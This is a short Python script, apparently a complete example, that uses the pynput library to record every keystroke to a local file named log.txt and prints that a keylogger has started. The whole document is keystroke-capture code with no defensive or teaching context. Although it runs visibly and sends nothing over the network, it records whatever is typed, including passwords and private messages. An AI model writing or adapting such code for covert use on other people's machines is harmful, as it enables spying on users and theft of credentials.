from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()
input("Keylogger started. Press Enter to stop.\n")
listener.stop()
